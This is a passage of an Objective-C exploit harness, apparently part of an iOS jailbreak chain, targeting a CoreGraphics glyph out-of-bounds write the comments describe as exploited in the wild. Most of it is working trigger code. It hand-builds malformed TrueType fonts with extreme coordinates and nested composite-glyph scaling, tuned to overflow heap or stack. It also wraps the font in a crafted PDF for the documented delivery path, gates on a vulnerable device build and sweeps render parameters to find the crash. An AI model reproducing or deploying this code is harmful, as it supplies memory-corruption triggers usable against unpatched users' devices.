//
//  P072FileParserMap.m
//  File-parser chain slot. Three honest positions:
//    1. In-app CG/ImageIO/SceneKit/JPEG/CoreMedia parse ACEs THIS process
//       (already owned by the IPA). Cannot skip kread / commitSlide.
//    2. Privileged-daemon parse of a planted file (MobileBackup 84598,
//       lockdownd, Photos) is sandbox-adjacent. PARK remaining-fire.
//    3. AfterKread payload parse (board JSON, basebin.tar / basebin.tc)
//       is the jailbreak file mechanic. HOLD until kread32(kbase)==MH_MAGIC_64.
//  v1: dlopen census + 1x1 PNG ImageIO smoke. v2 adds the CVE-2026-86950
//  ("Great Glyph Grift") glyph-OOB oracle: synthetic 30-em extreme-coord
//  TrueType, AA-rasterizer device-space sweep (coarse + fixed-point
//  saturation band) + system-font fallback + extreme path fills. The craft
//  is byte-identical to the local macOS 15.6 (pre-15.8.1) prototype proof:
//  436B sfnt loads, 'A'->gid1 maps, control renders clean. No local trigger
//  with naive sweeps — the saturation inconsistency needs the crafted
//  value class or the PDF ingest path (p072 v3 vehicle). Per-render param
//  lines are fsync'd BEFORE each render = panic-ladder method.
//
//  CVE-2026-86950 verified matrix (2026-10-21): fixed ONLY in 26.7.1
//  (HT149226, Sep 28 2026) -> LIVE on 23F77 (the hunt rig!), patched on
//  the A12X 26.7.1 twin. ITW per Apple ("extremely sophisticated attack
//  against specific targeted individuals on versions before iOS 27").
//

#import "P072FileParserMap.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <CoreGraphics/CoreGraphics.h>
#import <CoreText/CoreText.h>
#import <ImageIO/ImageIO.h>
#import <zlib.h>
#import <signal.h>
#import <setjmp.h>
#import <mach/mach.h>
#import <dlfcn.h>
#import <fcntl.h>

/* v5 OOB harness guarded-fault plumbing (file scope: C forbids nested fns) */
static sigjmp_buf p072v5_jmp;
static volatile int p072v5_in = 0;
static void p072v5_fault(int sig) {
    if (p072v5_in) { p072v5_in = 0; siglongjmp(p072v5_jmp, sig); }
    signal(sig, SIG_DFL); raise(sig);
}

#import <string.h>
#import <unistd.h>

#define P072_BUILD @"p072-86950-oob-harness-v5"

static void p072_dl(void (^L)(NSString *), const char *path) {
    void *h = dlopen(path, RTLD_LAZY);
    L([NSString stringWithFormat:@"  %-72s %s", path, h ? "OPEN" : "MISS"]);
    if (h) dlclose(h);
}

/* ---------- 86950 oracle: byte helpers ---------- */

static void p072_be32(uint8_t *p, uint32_t v) {
    p[0]=(uint8_t)(v>>24); p[1]=(uint8_t)(v>>16); p[2]=(uint8_t)(v>>8); p[3]=(uint8_t)v;
}
static void p072_be16(uint8_t *p, uint16_t v) { p[0]=(uint8_t)(v>>8); p[1]=(uint8_t)v; }
static uint32_t p072_tsum(const uint8_t *b, uint32_t len) {
    uint32_t s=0, n=(len+3)&~3u;
    for (uint32_t i=0;i<n;i+=4) {
        uint32_t w=0;
        for (int j=0;j<4;j++) w=(w<<8)|((i+(uint32_t)j<len)?b[i+j]:0);
        s+=w;
    }
    return s;
}

/* glyph1: 1 contour, 3 on-curve points (30000,30000)(-30000,-30000)(30000,-30000)
   in a upem-1000 font = a 30-em glyph; head xmin..xmax = +-30000. */
static uint8_t p072_G1[29];
static void p072_build_glyph1(void) {
    uint8_t *g=p072_G1; int i=0;
    p072_be16(g+i,1); i+=2;                       /* numberOfContours */
    p072_be16(g+i,(uint16_t)-30000); i+=2;        /* xMin */
    p072_be16(g+i,(uint16_t)-30000); i+=2;        /* yMin */
    p072_be16(g+i,30000); i+=2;                   /* xMax */
    p072_be16(g+i,30000); i+=2;                   /* yMax */
    p072_be16(g+i,2); i+=2;                       /* endPtsOfContours[0] */
    p072_be16(g+i,0); i+=2;                       /* instructionLength */
    g[i++]=0x01; g[i++]=0x01; g[i++]=0x01;        /* flags: on-curve, int16 deltas */
    p072_be16(g+i,30000); i+=2;                   /* dx1 */
    p072_be16(g+i,(uint16_t)-60000); i+=2;        /* dx2 */
    p072_be16(g+i,60000); i+=2;                   /* dx3 */
    p072_be16(g+i,30000); i+=2;                   /* dy1 */
    p072_be16(g+i,(uint16_t)-60000); i+=2;        /* dy2 */
    p072_be16(g+i,60000); i+=2;                   /* dy3 */
}

/* Minimal valid TrueType: cmap/glyf/head/hhea/hmtx/loca/maxp/name/post.
   436 bytes; validated on macOS 15.6 CG: CGFont loads (glyphs=2),
   CTFontGetGlyphsForCharacters('A') -> gid 1 (ok=1), control renders. */
static NSData *p072_build_ttf(void) {
    p072_build_glyph1();
    uint8_t cmap[48], loca[8], name[36], post[32];
    uint8_t head[54], hhea[36], maxp[32], hmtx[4];
    uint8_t gpad[32]; memset(gpad,0,32); memcpy(gpad,p072_G1,29);

    memset(head,0,54);
    p072_be32(head+0,0x00010000); p072_be32(head+4,0x00010000);
    p072_be32(head+12,0x5F0F3CF5);
    p072_be16(head+18,1000);
    p072_be16(head+36,(uint16_t)-30000); p072_be16(head+38,(uint16_t)-30000);
    p072_be16(head+40,30000);            p072_be16(head+42,30000);
    p072_be16(head+46,8); p072_be16(head+48,2); p072_be16(head+50,0); p072_be16(head+52,0);

    memset(hhea,0,36);
    p072_be32(hhea+0,0x00010000);
    p072_be16(hhea+4,800); p072_be16(hhea+6,(uint16_t)-200); p072_be16(hhea+8,0);
    p072_be16(hhea+10,1000); p072_be16(hhea+16,30000); p072_be16(hhea+18,1);
    p072_be16(hhea+34,1);

    memset(maxp,0,32);
    p072_be32(maxp+0,0x00010000); p072_be16(maxp+4,2);
    p072_be16(maxp+6,8); p072_be16(maxp+8,2); p072_be16(maxp+12,2);

    p072_be16(hmtx+0,1000); p072_be16(hmtx+2,0);

    /* cmap format4: 'A'(0x41) -> +0xFFC0 = gid 1; 0xFFFF -> +1 = gid 0 */
    memset(cmap,0,48);
    p072_be16(cmap+0,0); p072_be16(cmap+2,1);
    p072_be16(cmap+4,3); p072_be16(cmap+6,1); p072_be32(cmap+8,12);
    p072_be16(cmap+12,4); p072_be16(cmap+14,32); p072_be16(cmap+16,0);
    p072_be16(cmap+18,4); p072_be16(cmap+20,4); p072_be16(cmap+22,1); p072_be16(cmap+24,0);
    p072_be16(cmap+26,0x41);   p072_be16(cmap+28,0xFFFF);   /* endCode  */
    p072_be16(cmap+30,0);                                    /* pad      */
    p072_be16(cmap+32,0x41);   p072_be16(cmap+34,0xFFFF);   /* startCode*/
    p072_be16(cmap+36,0xFFC0); p072_be16(cmap+38,1);        /* idDelta  */
    p072_be16(cmap+40,0);      p072_be16(cmap+42,0);        /* idRangeOffset */

    /* loca short: glyph0 empty @0, glyph1 @0, glyph1 end = 32/2 */
    p072_be16(loca+0,0); p072_be16(loca+2,0); p072_be16(loca+4,16);

    memset(name,0,36);
    p072_be16(name+0,0); p072_be16(name+2,2); p072_be16(name+4,30);
    p072_be16(name+6,3); p072_be16(name+8,1); p072_be16(name+10,0x409);
    p072_be16(name+12,1); p072_be16(name+14,5); p072_be16(name+16,0);
    p072_be16(name+18,3); p072_be16(name+20,1); p072_be16(name+22,0x409);
    p072_be16(name+24,4); p072_be16(name+26,5); p072_be16(name+28,0);
    memcpy(name+30,"L072G",5);

    memset(post,0,32); p072_be32(post+0,0x00030000); p072_be16(post+10,50);

    struct { char tag[4]; uint8_t *d; uint32_t len; } T[] = {
        {"cmap",cmap,44},{"glyf",gpad,32},{"head",head,54},{"hhea",hhea,36},
        {"hmtx",hmtx,4},{"loca",loca,8},{"maxp",maxp,32},{"name",name,36},{"post",post,32},
    };
    const int nt=9;
    uint32_t offs[9], lensTmp[9], cur = 12+(uint32_t)nt*16;
    for (int i=0;i<nt;i++) lensTmp[i]=T[i].len;
    for (int i=0;i<nt;i++) { offs[i]=(cur+3)&~3u; cur=offs[i]+lensTmp[i]; }

    NSMutableData *d=[NSMutableData dataWithLength:cur];
    uint8_t *b=(uint8_t *)d.mutableBytes;
    p072_be32(b+0,0x00010000); p072_be16(b+4,nt); p072_be16(b+6,128); p072_be16(b+8,3); p072_be16(b+10,16);
    for (int i=0;i<nt;i++) {
        uint8_t *e=b+12+(uint32_t)i*16;
        memcpy(e,T[i].tag,4);
        p072_be32(e+4,p072_tsum(T[i].d,lensTmp[i]));
        p072_be32(e+8,offs[i]); p072_be32(e+12,lensTmp[i]);
        memcpy(b+offs[i],T[i].d,lensTmp[i]);
    }
    return d;
}

/* Render one glyph combo into a fixed 8x8 RGBA context (AA rasterizer path). */
static void p072_render(CGBitmapInfo alphaInfo, CGFontRef font, CGGlyph glyph,
                        double size, double sx, double sy, double px, double py) {
    static uint8_t R[8*8*4];                      /* fixed backing store */
    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
    CGContextRef ctx = CGBitmapContextCreate(R,8,8,8,32,cs,alphaInfo);
    if (cs) CGColorSpaceRelease(cs);
    if (!ctx) return;
    CGContextSetRGBFillColor(ctx,1,0,0,1);
    CGContextScaleCTM(ctx,sx,sy);
    CGContextTranslateCTM(ctx,px,py);
    CGContextSetFont(ctx,font);
    CGContextSetFontSize(ctx,size);
    CGPoint pos={0,0};
    CGContextShowGlyphsAtPositions(ctx,&glyph,&pos,1);
    CGContextFlush(ctx);
    CGContextRelease(ctx);
}

/* Extreme path fill through the same aa_* machinery (no font). */
static void p072_pathfill(double extreme) {
    static uint8_t R2[8*8*4];
    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
    CGContextRef ctx = CGBitmapContextCreate(R2,8,8,8,32,cs,kCGImageAlphaPremultipliedLast);
    if (cs) CGColorSpaceRelease(cs);
    if (!ctx) return;
    CGContextSetRGBFillColor(ctx,0,0,1,1);
    CGContextScaleCTM(ctx,1e6*extreme,1e6*extreme);
    CGContextMoveToPoint(ctx,0.5,0.5);
    CGContextAddLineToPoint(ctx,30000,-30000);
    CGContextAddLineToPoint(ctx,-30000,-30000);
    CGContextClosePath(ctx);
    CGContextFillPath(ctx);
    CGContextRelease(ctx);
}

/* ================= 86950 PDF VEHICLE (v3) =================
   Our reimplementation of the CVE-2026-86950 trigger class
   (parameters per Calif's "The Great Glyph Grift" - no third-party
   bytes). Local validation on macOS 15.7.8: 672B sfnt loads (glyphs=11),
   'A'->gid10 maps, composite chain renders (gid10@17 = 23836 px vs
   leaf@17 = 68 px -> the 512x chain scaling is live), PDF parses clean.
   Device route = the documented delivery path: PDF -> ImageIO
   CGImageSourceCreateThumbnailAtIndex -> PDFReadPlugin -> op_Tj ->
   glyph chain -> aa_cache_render. */

#define P072V3_UPM    16384
#define P072V3_DX     33      /* >=32 -> malloc/heap OOB; <=31 -> alloca/stack */
#define P072V3_NCOMP  9       /* composite glyphs: c0..c7 + A */
#define P072V3_NUMG   (2 + P072V3_NCOMP)   /* 11 */

static void p072v3_be32(uint8_t *p, uint32_t v){ p[0]=(uint8_t)(v>>24); p[1]=(uint8_t)(v>>16); p[2]=(uint8_t)(v>>8); p[3]=(uint8_t)v; }
static void p072v3_be16(uint8_t *p, uint16_t v){ p[0]=(uint8_t)(v>>8); p[1]=(uint8_t)v; }
static uint32_t p072v3_tsum(const uint8_t *b, uint32_t len){
    uint32_t s=0, n=(len+3)&~3u;
    for (uint32_t i=0;i<n;i+=4){ uint32_t w=0;
        for (int j=0;j<4;j++) w=(w<<8)|((i+(uint32_t)j<len)?b[i+j]:0);
        s+=w; }
    return s;
}

/* leaf: contour0 rect (0,0)..(DX,40) sets bbox/coverage width; contour1
   = 2-pt line at x=32000 (the sat/trunc mismatch contour). 46 bytes. */
static void p072v3_build_leaf(uint8_t *g){
    int i=0;
    p072v3_be16(g+i,2); i+=2;
    p072v3_be16(g+i,0); i+=2;
    p072v3_be16(g+i,0); i+=2;
    p072v3_be16(g+i,P072V3_DX); i+=2;
    p072v3_be16(g+i,40); i+=2;
    p072v3_be16(g+i,3); i+=2;       /* endPts[0]=3 */
    p072v3_be16(g+i,5); i+=2;       /* endPts[1]=5 */
    p072v3_be16(g+i,0); i+=2;       /* instructionLength */
    for (int f=0;f<6;f++) g[i++]=0x01;
    p072v3_be16(g+i,0); i+=2;      p072v3_be16(g+i,0); i+=2;
    p072v3_be16(g+i,P072V3_DX); i+=2; p072v3_be16(g+i,0); i+=2;
    p072v3_be16(g+i,0); i+=2;      p072v3_be16(g+i,40); i+=2;
    p072v3_be16(g+i,(uint16_t)-P072V3_DX); i+=2; p072v3_be16(g+i,0); i+=2;
    p072v3_be16(g+i,32000); i+=2;  p072v3_be16(g+i,(uint16_t)-39); i+=2;
    p072v3_be16(g+i,0); i+=2;      p072v3_be16(g+i,38); i+=2;
}

/* composite glyph (18B): 0xFFFF signature + forced bbox, then component
   flags 0x000E (ARGS_ARE_XY_VALUES|ROUND_XY_TO_GRID|WE_HAVE_A_SCALE),
   glyphIndex, s8 dx dy, F2Dot14 0x7FFF (~2.0 per level). */
static void p072v3_build_composite(uint8_t *c, uint16_t gid){
    p072v3_be16(c+0,0xFFFF);
    p072v3_be16(c+2,0); p072v3_be16(c+4,0);
    p072v3_be16(c+6,P072V3_DX); p072v3_be16(c+8,40);
    p072v3_be16(c+10,0x000E);
    p072v3_be16(c+12,gid);
    c[14]=0; c[15]=0;
    p072v3_be16(c+16,0x7FFF);
}

/* gid1=leaf; gid2..gid10=composites; glyph g references g-1 (9 levels):
   leaf x = 32000 * (32767/16384)^9 ~= 16.4M font units. */
static NSData *p072v3_build_ttf(void){
    const uint32_t leafLen=46, compLen=18;
    uint32_t glyfLen = leafLen + (uint32_t)P072V3_NCOMP*compLen;
    uint8_t *glyf = malloc(glyfLen);
    p072v3_build_leaf(glyf);
    for (int k=0;k<P072V3_NCOMP;k++) {
        uint8_t comp[18];
        p072v3_build_composite(comp, (uint16_t)(1+k));
        memcpy(glyf+leafLen+(uint32_t)k*compLen, comp, 18);
    }
    uint8_t head[54], hhea[36], maxp[32], name[40], post[32], cmap[48];
    uint8_t *hmtx = malloc((uint32_t)P072V3_NUMG*4);
    uint8_t *loca = malloc((uint32_t)(P072V3_NUMG+1)*2);
    memset(head,0,54);
    p072v3_be32(head+0,0x00010000); p072v3_be32(head+4,0x00010000);
    p072v3_be32(head+12,0x5F0F3CF5);
    p072v3_be16(head+18,P072V3_UPM);
    p072v3_be16(head+36,0); p072v3_be16(head+38,0);
    p072v3_be16(head+40,P072V3_DX); p072v3_be16(head+42,40);
    p072v3_be16(head+46,8); p072v3_be16(head+48,2); p072v3_be16(head+50,0); p072v3_be16(head+52,0);
    memset(hhea,0,36);
    p072v3_be32(hhea+0,0x00010000);
    p072v3_be16(hhea+4,100); p072v3_be16(hhea+6,(uint16_t)-100);
    p072v3_be16(hhea+10,100); p072v3_be16(hhea+16,P072V3_DX); p072v3_be16(hhea+18,1);
    p072v3_be16(hhea+34,(uint16_t)P072V3_NUMG);
    memset(maxp,0,32);
    p072v3_be32(maxp+0,0x00010000);
    p072v3_be16(maxp+4,(uint16_t)P072V3_NUMG);
    p072v3_be16(maxp+14,2);
    p072v3_be16(maxp+30,(uint16_t)P072V3_NCOMP);
    for (int i=0;i<P072V3_NUMG;i++){ p072v3_be16(hmtx+4*i,100); p072v3_be16(hmtx+4*i+2,0); }
    /* cmap format4: 'A'(0x41) -> gid 10 */
    memset(cmap,0,48);
    p072v3_be16(cmap+0,0); p072v3_be16(cmap+2,1);
    p072v3_be16(cmap+4,3); p072v3_be16(cmap+6,1); p072v3_be32(cmap+8,12);
    p072v3_be16(cmap+12,4); p072v3_be16(cmap+14,32); p072v3_be16(cmap+16,0);
    p072v3_be16(cmap+18,4); p072v3_be16(cmap+20,4); p072v3_be16(cmap+22,1); p072v3_be16(cmap+24,0);
    p072v3_be16(cmap+26,0x41);   p072v3_be16(cmap+28,0xFFFF);
    p072v3_be16(cmap+32,0x41);   p072v3_be16(cmap+34,0xFFFF);
    p072v3_be16(cmap+36,(uint16_t)((P072V3_NUMG-1)-0x41)); p072v3_be16(cmap+38,1);
    uint32_t offs[P072V3_NUMG+1], cur=0;
    for (int g=0;g<P072V3_NUMG;g++){
        offs[g]=cur;
        cur += (g==1) ? leafLen : ((g>=2) ? compLen : 0);
        cur = (cur+1)&~1u;
    }
    offs[P072V3_NUMG]=cur;
    for (int i=0;i<=P072V3_NUMG;i++) p072v3_be16(loca+2*i,(uint16_t)(offs[i]/2));
    memset(name,0,40);
    p072v3_be16(name+0,0); p072v3_be16(name+2,2); p072v3_be16(name+4,32);
    p072v3_be16(name+6,3);  p072v3_be16(name+8,1);  p072v3_be16(name+10,0x409);
    p072v3_be16(name+12,1); p072v3_be16(name+14,5); p072v3_be16(name+16,0);
    p072v3_be16(name+18,3); p072v3_be16(name+20,1); p072v3_be16(name+22,0x409);
    p072v3_be16(name+24,2); p072v3_be16(name+26,1); p072v3_be16(name+28,5);
    memcpy(name+32,"L072T",5); name[37]='R';
    memset(post,0,32); p072v3_be32(post+0,0x00030000); p072v3_be16(post+10,50);
    struct { const char *tag; uint8_t *d; uint32_t len; } T[] = {
        {"cmap",cmap,44},{"glyf",glyf,glyfLen},{"head",head,54},{"hhea",hhea,36},
        {"hmtx",hmtx,(uint32_t)P072V3_NUMG*4},{"loca",loca,(uint32_t)(P072V3_NUMG+1)*2},
        {"maxp",maxp,32},{"name",name,40},{"post",post,32},
    };
    const int nt=9;
    uint32_t cur0=12+(uint32_t)nt*16, offs2[9];
    for (int i=0;i<nt;i++){ offs2[i]=(cur0+3)&~3u; cur0=offs2[i]+T[i].len; }
    NSMutableData *d=[NSMutableData dataWithLength:cur0];
    uint8_t *b=(uint8_t *)d.mutableBytes;
    p072v3_be32(b+0,0x00010000);
    p072v3_be16(b+4,nt); p072v3_be16(b+6,128); p072v3_be16(b+8,3); p072v3_be16(b+10,16);
    for (int i=0;i<nt;i++){
        uint8_t *e=b+12+(uint32_t)i*16;
        memcpy(e,T[i].tag,4);
        p072v3_be32(e+4,p072v3_tsum(T[i].d,T[i].len));
        p072v3_be32(e+8,offs2[i]); p072v3_be32(e+12,T[i].len);
        memcpy(b+offs2[i],T[i].d,T[i].len);
    }
    free(glyf); free(hmtx); free(loca);
    return d;
}

/* Minimal PDF: BT /F1 1024 Tf 5 5 Td (A) Tj ET, /FontFile2 = flate(ttf). */
static NSData *p072v3_build_pdf(NSData *ttf){
    const char *raw=(const char *)ttf.bytes;
    NSUInteger rawLen=ttf.length;
    uint8_t *zbuf=malloc(rawLen+1024);
    uLongf zlen=(uLongf)(rawLen+1024);
    if (compress(zbuf,&zlen,(const Bytef *)raw,(uLong)rawLen)!=Z_OK){ free(zbuf); return nil; }
    uint8_t stream[]="BT /F1 1024 Tf 5 5 Td (A) Tj ET\n";
    uint32_t slen=(uint32_t)(sizeof(stream)-1);
    NSMutableData *d=[NSMutableData data];
    NSString *o0=@"<< /Type /Catalog /Pages 2 0 R >>";
    NSString *o1=@"<< /Type /Pages /Kids [3 0 R] /Count 1 >>";
    NSString *o2=@"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
                  "/Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>";
    const char *s3fmt="<< /Length %u >>\nstream\n%s endstream";
    char ob3[128];
    snprintf(ob3,sizeof ob3,s3fmt,(unsigned)slen,(char*)stream);
    NSString *o3=[NSString stringWithUTF8String:ob3];
    NSString *o4=@"<< /Type /Font /Subtype /TrueType /BaseFont /L072Trigger "
                  "/FirstChar 65 /LastChar 65 /Widths [100] "
                  "/Encoding /WinAnsiEncoding /FontDescriptor 6 0 R >>";
    NSString *o5=@"<< /Type /FontDescriptor /FontName /L072Trigger /Flags 4 "
                  "/FontBBox [0 0 4 40] /ItalicAngle 0 /Ascent 100 /Descent -100 "
                  "/CapHeight 100 /StemV 80 /FontFile2 7 0 R >>";
    NSString *o6=[NSString stringWithFormat:@"<< /Length %lu /Length1 %lu /Filter /FlateDecode >>\nstream\n",
                  (unsigned long)zlen,(unsigned long)rawLen];
    NSString *hdrs[7]={o0,o1,o2,o3,o4,o5,o6};
    [d appendBytes:"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n" length:15];
    uint32_t offs[7];
    for (int i=0;i<7;i++){
        offs[i]=(uint32_t)d.length;
        char h[32]; int hl=snprintf(h,sizeof h,"%d 0 obj\n",i+1);
        [d appendBytes:h length:(NSUInteger)hl];
        [d appendBytes:hdrs[i].UTF8String length:hdrs[i].length];
        if (i==6){
            [d appendBytes:zbuf length:(NSUInteger)zlen];
            [d appendBytes:"\nendstream\nendobj\n" length:17];
        } else {
            [d appendBytes:"\nendobj\n" length:8];
        }
    }
    uint32_t tablePos=(uint32_t)d.length;
    char x[64]; int xl=snprintf(x,sizeof x,"xref\n0 8\n0000000000 65535 f \n");
    [d appendBytes:x length:(NSUInteger)xl];
    for (int i=0;i<7;i++){
        char e[32]; int el=snprintf(e,sizeof e,"%010u 00000 n \n",offs[i]);
        [d appendBytes:e length:(NSUInteger)el];
    }
    char t[128]; int tl=snprintf(t,sizeof t,
        "trailer\n<< /Size 8 /Root 1 0 R >>\nstartxref\n%u\n%%%%EOF\n", tablePos);
    [d appendBytes:t length:(NSUInteger)tl];
    free(zbuf);
    return d;
}

@implementation P072FileParserMap

+ (NSString *)tap {
    NSMutableString *log = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *logPath = [docs stringByAppendingPathComponent:@"p072_file_parser_log.txt"];
    int fd = open(logPath.UTF8String, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    void (^L)(NSString *) = ^(NSString *s) {
        NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
        [log appendString:out];
        if (fd >= 0) { const char *p = out.UTF8String; if (p) write(fd, p, strlen(p)); }
    };
    void (^Lv)(NSString *) = ^(NSString *s) {       /* oracle line: fsync BEFORE the caller proceeds */
        L(s);
        if (fd >= 0) fsync(fd);
    };

    L([NSString stringWithFormat:@"=== p072 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P072_BUILD]);
    L(@"File-parser chain slot: v1 census + v2 CVE-2026-86950 glyph-OOB oracle.");
    L(@"86950 fixed ONLY in 26.7.1 (HT149226) -> LIVE on 23F77. ITW per Apple.");
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p072"];
    if (stop) {
        L(stop);
        if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
        return log;
    }
    L([LabDeviceProfile identBlock]);

    L(@"=== THREE SLOTS ===");
    L(@"1 IN-APP ACE   CG / ImageIO / SceneKit / JPEG / CoreMedia in this IPA.");
    L(@"               Decode of a crafted file only ACEs the already-controlled");
    L(@"               process. Dest-lookup current_task() still applies unless a");
    L(@"               privileged XPC decoder is in the path. Cannot skip kread.");
    L(@"               PARK remaining-fire. Sibling: JPEGFrameworkDecodeProbe ABI");
    L(@"               smoke + P058 AppleJPEGDriver IOServiceOpen (no +0x30 teardown).");
    L(@"2 DAEMON PLANT MobileBackup 84598 / lockdownd / Photos parse a file the");
    L(@"               app can write. Sandbox-adjacent. Still not kread. PARK.");
    L(@"3 AFTER KREAD  board JSON + basebin.tar / basebin.tc ingest. This is the");
    L(@"               jailbreak file mechanic once commitSlide sticks.");
    L(@"               HOLD until kread32(kbase)==0xfeedfacf.");

    L(@"=== HT149041 FILE-ACE CVE IDS (PARK, no PoC). 86950 = THE LIVE ONE ===");
    L(@"  86950 CoreGraphics OOB write (26.7.1 HT149226). Userspace ACE. NOW FIRING BELOW.");
    L(@"  86882 Accelerate  84519 AppleDouble  65344/86876/43702 CoreMedia");
    L(@"  84552 DiskImages  84510 exFAT  84534 file_cmds  84524 FontParser");
    L(@"  84564/64758/43661/86869/65395 ImageIO  86870 libarchive  84497 ModelIO");
    L(@"  84532/28966 RealityKit");
    L(@"  84487/84546/84611/84632/84620/84526 SceneKit  84492 Graphics race");
    L(@"  43715/64718 WebKit  84624 CoreML path  84598 MobileBackup physical ACE");

    L(@"=== DLOPEN CENSUS (reach, not fire) ===");
    p072_dl(L, "/System/Library/Frameworks/ImageIO.framework/ImageIO");
    p072_dl(L, "/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics");
    p072_dl(L, "/System/Library/Frameworks/CoreImage.framework/CoreImage");
    p072_dl(L, "/System/Library/Frameworks/CoreMedia.framework/CoreMedia");
    p072_dl(L, "/System/Library/Frameworks/VideoToolbox.framework/VideoToolbox");
    p072_dl(L, "/System/Library/Frameworks/SceneKit.framework/SceneKit");
    p072_dl(L, "/System/Library/Frameworks/ModelIO.framework/ModelIO");
    p072_dl(L, "/System/Library/Frameworks/RealityKit.framework/RealityKit");
    p072_dl(L, "/System/Library/Frameworks/Accelerate.framework/Accelerate");
    p072_dl(L, "/usr/lib/libarchive.dylib");
    p072_dl(L, "/System/Library/PrivateFrameworks/FontServices.framework/FontServices");
    p072_dl(L, "/System/Library/PrivateFrameworks/CoreSceneUnderstanding.framework/CoreSceneUnderstanding");

    L(@"=== 1x1 PNG SMOKE (ImageIO, reach) ===");
    NSMutableData *png = [NSMutableData data];
    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
    CGContextRef bctx = CGBitmapContextCreate(NULL, 1, 1, 8, 4, cs,
                                              kCGImageAlphaPremultipliedLast);
    CGImageRef made = NULL;
    if (bctx) {
        CGContextSetRGBFillColor(bctx, 1, 0, 0, 1);
        CGContextFillRect(bctx, CGRectMake(0, 0, 1, 1));
        made = CGBitmapContextCreateImage(bctx);
        CGContextRelease(bctx);
    }
    if (cs) CGColorSpaceRelease(cs);
    BOOL destOk = NO;
    if (made) {
        CGImageDestinationRef dest = CGImageDestinationCreateWithData(
            (__bridge CFMutableDataRef)png, CFSTR("public.png"), 1, NULL);
        if (dest) {
            CGImageDestinationAddImage(dest, made, NULL);
            destOk = CGImageDestinationFinalize(dest);
            CFRelease(dest);
        }
        CGImageRelease(made);
    }
    L([NSString stringWithFormat:@"png encode destOk=%@ bytes=%lu",
       destOk ? @"YES" : @"NO", (unsigned long)png.length]);

    BOOL decodeOk = NO;
    size_t w = 0, h = 0;
    if (png.length) {
        CGImageSourceRef src = CGImageSourceCreateWithData(
            (__bridge CFDataRef)png, NULL);
        if (src) {
            CGImageRef img = CGImageSourceCreateImageAtIndex(src, 0, NULL);
            if (img) {
                w = CGImageGetWidth(img);
                h = CGImageGetHeight(img);
                decodeOk = (w == 1 && h == 1);
                CGImageRelease(img);
            }
            CFRelease(src);
        }
    }
    L([NSString stringWithFormat:@"png decode ok=%@ %zux%zu (want 1x1)",
       decodeOk ? @"YES" : @"NO", w, h]);

    /* ================= 86950 GLYPH OOB ORACLE =================
       Panic-ladder method: every render line is fsync'd BEFORE the
       render runs. A device crash names the in-flight param set. */

    L(@"=== 86950 GLYPH OOB ORACLE (Calif aa_double_to_fixed shape) ===");
    L(@"craft: synthetic 30-em extreme-coord TTF (30000/1000 upem), validated");
    L(@"on macOS 15.6 pre-fix CG: 436B loads, 'A'->gid1 ok, control clean.");

    NSData *ttf = p072_build_ttf();
    Lv([NSString stringWithFormat:@"craft built %lu bytes",
        (unsigned long)ttf.length]);

    CGFontRef craftFont = NULL;
    CGDataProviderRef dp = CGDataProviderCreateWithCFData((__bridge CFDataRef)ttf);
    if (dp) {
        craftFont = CGFontCreateWithDataProvider(dp);
        CFRelease(dp);
    }
    if (craftFont) {
        Lv([NSString stringWithFormat:@"craft font LOAD OK glyphs=%zu",
            CGFontGetNumberOfGlyphs(craftFont)]);
        CTFontRef ctf = CTFontCreateWithGraphicsFont(craftFont, 17, NULL, NULL);
        CGGlyph ctg = 0;
        BOOL ctmapped = CTFontGetGlyphsForCharacters(ctf, (const UniChar[]){'A'}, &ctg, 1);
        Lv([NSString stringWithFormat:@"CT 'A' map -> gid %u ok=%d (using gid 1 by construction)",
            (unsigned)ctg, ctmapped ? 1 : 0]);
        if (ctf) CFRelease(ctf);

        /* control: normal geometry MUST complete */
        Lv(@"[ctl] size=17 scale=1 pos=0");
        p072_render((CGBitmapInfo)kCGImageAlphaPremultipliedLast, craftFont, 1, 17, 1, 1, 0, 0);
        Lv(@"[ctl] OK");

        double sizes[]  = {1, 1e3, 1e6};
        double scales[] = {1, 1e2, 1e6, 1e12};
        double poss[]   = {0, 1e9};
        int n = 0;
        for (int i=0;i<3;i++) for (int j=0;j<4;j++) for (int k=0;k<2;k++) {
            Lv([NSString stringWithFormat:@"[R%03d] size=%.0e scale=%.0e pos=%.0e",
                n, sizes[i], scales[j], poss[k]]);
            p072_render((CGBitmapInfo)kCGImageAlphaPremultipliedLast, craftFont, 1,
                        sizes[i], scales[j], scales[j], poss[k], poss[k]);
            n++;
        }
        Lv([NSString stringWithFormat:@"[sweep] glyph done %d renders", n]);

        double band[] = {1e5,1e6,1e7,1e8,1.3e8,2.1e8,3.4e8,1.07e9,2.1e9,4.2e9,
                         3.4e10,2.1e12,1.4e14,1e15,1e16};
        int m = 0;
        for (int i=0;i<15;i++) {
            Lv([NSString stringWithFormat:@"[B%02d] band=%e (size=1 scale=%e pos=0)",
                i, band[i], band[i]]);
            p072_render((CGBitmapInfo)kCGImageAlphaPremultipliedLast, craftFont, 1,
                        1, band[i], band[i], 0, 0);
            m++;
        }
        Lv([NSString stringWithFormat:@"[sweep] band done %d renders", m]);
    } else {
        Lv(@"craft font LOAD FAIL (CGFontCreateWithDataProvider) — fallback sweep only");
    }

    /* fallback: system font, identical sweep — the bug is in the shared
       AA rasterizer; a craft is not strictly required to reach it */
    CTFontRef sys = CTFontCreateWithName(CFSTR("Helvetica"), 17, NULL);
    CGFontRef sysFont = CTFontCopyGraphicsFont(sys, NULL);
    if (sysFont) {
        CGGlyph sysg = 0;
        CTFontRef sysProbe = sys;
        UniChar a = 'A';
        BOOL ok = CTFontGetGlyphsForCharacters(sysProbe, &a, &sysg, 1);
        Lv([NSString stringWithFormat:@"system font Helvetica gid=%u ok=%d",
